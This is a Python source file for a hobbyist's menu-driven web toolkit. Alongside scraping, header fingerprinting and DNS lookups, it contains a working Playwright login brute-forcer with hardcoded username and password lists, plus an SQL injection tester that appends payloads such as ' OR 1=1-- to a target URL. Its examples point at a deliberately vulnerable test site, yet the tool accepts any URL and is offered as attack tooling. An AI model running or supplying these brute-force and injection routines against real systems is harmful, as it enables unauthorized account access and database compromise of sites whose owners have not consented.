import requests
import pyfiglet
from rich import print
import socket
from playwright.sync_api import sync_playwright
import time
import os
os.system("clear")
#end libraries
#start functions
def sql():
    payloads = [
    "'", "\\",
    "' OR '1'='1", 
    "' OR 1=1--",   
    "\" OR \"\"=\"", 
    "';--",
    ]
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        base_url = input("Enter the link with the query: ") 
        #http://testphp.vulnweb.com/search.php?test=query
        page = browser.new_page()
        try:
            page.goto(base_url)
            original_content = page.text_content('body')
            page.close()
        except Exception as e:
            print(f"[!] Failed to open base URL: {e}")
            browser.close()
            return

        for payload in payloads:
            url_with_payload = f"{base_url}{payload}"

            try:
                new_page = browser.new_page()
                new_page.goto(url_with_payload)
                modified_content = new_page.text_content('body')
                new_page.close()

                if original_content != modified_content:
                    print(f"[+] SQL Injection Detected at: {url_with_payload} | Payload: {payload}")
                else:
                    print(f"[-] No SQLi change with payload: {payload}")
            except Exception as e:
                print(f"[!] Error testing payload {payload}: {e}")

        browser.close()

#brute force
def brute_force():
    print("[bold yellow]Note:[/bold yellow] Make sure the login page contains:")
    print(" - [bold green]Username field:[/] input with type='text' or name containing 'user' or 'uname'")
    print(" - [bold green]Password field:[/] input with type='password'")
    print(" - [bold green]Submit button:[/] input[type='submit'] or button[type='submit']")
    print("Link Example: http://testphp.vulnweb.com/login.php\n")

    try:
        url = input("Enter the login page URL: ").strip()
        if not url.startswith("http"):
            raise ValueError("URL must start with 'http' or 'https'")
    except Exception as e:
        print(f"[bold red]Invalid URL:[/] {e}")
        return

    usernames = [
        "test", "administrator", "admin123", "root", "demo", "user", "guest",
        "manager", "superuser", "support", "john", "jane", "webmaster", "owner",
        "system", "security", "demo", "backend", "developer", "client", "portal"
    ]
    passwords = [
         "qwertyui", "amr", "supersecure", "P@ssw0rd!", "1234admin","test",
        "welcome123", "login2024", "access123", "changeme", "default", "123admin!",
        "securepass2024", "admin!@#", "Admin2024", "pass123!", "adminadmin", "adminadmin123"
    ]

    with sync_playwright() as pr:
        browser = pr.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(url)

        username_input = page.query_selector("input[type='text'], input[name*='user'], input[name*='uname']")
        password_input = page.query_selector("input[type='password']")
        if not username_input or not password_input:
            print("[bold red][-] Could not find username or password input fields on the page[/]")
            browser.close()
            return

        username_selector = f"input[name='{username_input.get_attribute('name')}']"
        password_selector = f"input[name='{password_input.get_attribute('name')}']"
        login_button_selector = "input[type='submit'], button[type='submit']"

        print(f"[bold green][+][/bold green] Found input fields:")
        print(f" - Username field: [yellow]{username_selector}[/]")
        print(f" - Password field: [yellow]{password_selector}[/]")

        attempt = 0
        found = False
        start_time = time.time()

        for us in usernames:
            for pw in passwords:
                attempt += 1
                print(f"[cyan][{attempt}][/cyan] Trying: {us} / {pw}")

                page.goto(url)
                page.fill(username_selector, us)
                page.fill(password_selector, pw)
                page.click(login_button_selector)
                page.wait_for_timeout(1000)

                content = page.content()
                if "enter your login information below" not in content:
                    print("\n[bold green][+][/bold green] Login successful!")
                    print(f"[bold white on red] Username: {us} [/]")  
                    print(f"[bold white on blue] Password: {pw} [/]\n")
                    found = True
                    break
            if found:
                break

        end_time = time.time()
        total_time = end_time - start_time
        print(f"[bold magenta]Total time elapsed:[/] {total_time:.2f} seconds")

        if not found:
            print("[bold red][-] No valid credentials found.[/]")

        browser.close()


def web_scraping():
        url=input("Please give me the url with specific location:") 
        try:
            response=requests.get(url)
            if response.status_code==200:
                print("information get succssfully")
                print(response.text) 
                print("thanks for using me!")
        except Exception as e:
          print(e)
#start the while
while True:
    print(pyfiglet.figlet_format("A tools",font="slant"))
    print("welcom to AMoory's Toold!\nhere are the services:")
    print("""1)web scraping
2)post information to website
3)get information about the server
4)check the Avilability of a website and get it's ip 
5)get DNS information
6)get server Tecnology
7)Brute Force attack
8)sql attack""")
    service_num=int(input("please enter number service:"""))
    #program number 1!
    if service_num==1:
        web_scraping()

    elif service_num==2:
        print("please give me the fields of your link")
        chec=input("if you don't know who are they? priss |y| and i will give them to you:")
        if chec=='y':
            web_scraping()
            the_field1=input("please enter the field number 1:")
            the_value1=input("please enter the value number 1:")    
            the_field2=input("please enter the field number 2:")
            the_value2=input("please enter the value number 2:")    
            the_field3=input("please enter the field number 3:")
            the_value3=input("please enter the value number 3:") 
        else:
            print("ok give them to me:")
            the_field1=input("please enter the field number 1:")
            the_value1=input("please enter the value number 1:")    
            the_field2=input("please enter the field number 2:")
            the_value2=input("please enter the value number 2:")    
            the_field3=input("please enter the field number 3:")
            the_value3=input("please enter the value number 3:") 
        data={
            the_field1:the_value1,
            the_field2:the_value2,
            the_field3:the_value3
        }
        try:
            url_link=input("please enter the link of the website:")
            response=requests.post(url_link,data)
            print("code status:",response.status_code)
            print("respons:",response.text)       
        except Exception as e:
            print(e)
    elif service_num==3:
        Dns_url=input("please enter the website you want to fingerprint:") 
        response=requests.head(Dns_url)
        print("take the information:/n")
        for key,vaule in response.headers.items():
            print(f"{key}: {vaule}") 
    elif service_num==4:
        url_s4=input("please input the link of the website:")
        domain=input("please enter the domain now of your link: it's like(amr.com | without https):")
        ip=socket.gethostbyname(domain)
        try:
            respon=requests.get(url_s4)
            if respon.status_code==200:
                print("the information:\n")
                print(f"[bold blue]UP[/] {url_s4} [bold green] {respon.status_code}[/][bold red] {ip}[/] ")
            else:
                print(f"[bold blue]down[/] {url_s4} [bold green] {respon.status_code} [/][bold red]{ip}[/] ")    
        except Exception as e:
            print(e)  
    elif service_num==5:
        try:
            domain_s5=input("please enter the domain of your website:")
            res=requests.get(f"https://api.whois.vu/?q={domain_s5}")
            if res.status_code==200:
                print(res.text)  
        except Exception as e:
            print(e)
    elif service_num==6:
        try:
            url_s6=input("please enter the link of the website:")
            resp=requests.get(url_s6)
            if resp.status_code==200:
                print("the information is coming:")
                for x,y in resp.headers.items():
                    print(x+":"+y)
        except  Exception as e:
            print(e)
    elif service_num==7:
        brute_force()
    elif service_num==8:
         sql()   
    else:
        print("Error entring")  
    check=input("do you wanna exit from the tool? priss y:")  
    if check=='y':
        break   
#end the while
